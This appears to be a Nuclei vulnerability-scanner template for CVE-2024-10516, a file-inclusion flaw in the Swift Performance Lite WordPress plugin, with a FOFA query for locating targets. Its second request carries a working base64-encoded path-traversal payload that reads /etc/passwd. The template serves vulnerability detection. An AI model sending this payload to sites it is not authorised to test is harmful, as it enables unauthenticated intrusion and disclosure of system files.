id: CVE-2024-10516

info:
  name: Swift Performance Lite < 2.3.7.2 - Local PHP File Inclusion
  author: ritikchaddha
  severity: high
  description: |
    A vulnerability in Swift Performance Lite before version 2.3.7.2 allows unauthenticated attackers to perform local PHP file inclusion via the 'ajaxify' parameter. This can lead to arbitrary code execution on the server.
  reference:
    - https://github.com/RandomRobbieBF/CVE-2024-10516
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10516
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10516
    cwe-id: CWE-98
    epss-score: 0.78038
    epss-percentile: 0.9896
    cpe: cpe:2.3:a:swiftperformance:swift_performance_lite:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: swiftperformance
    product: swift_performance_lite
    fofa-query: body="/wp-content/plugins/swift-performance-lite"
  tags: cve,cve2024,wp,wp-plugin,wordpress,swift-performance,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/2
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "/wp-content/plugins/swift-performance-lite"
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/2
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=swift_performance_ajaxify&data=WyJ0ZW1wbGF0ZS1wYXJ0IiwibnVsbCIsIi4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiXQ==

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 4a0a004730450221009ea876d165d6f8843521df5394b9d0758333dc8cc20c1a980a3f96ae629d851e022067b36de3ce3516d1e7b1420b37e7ce6428edf765c6ea2d7f8e54cf716701597c:922c64590222798bb761d5b6d8e72950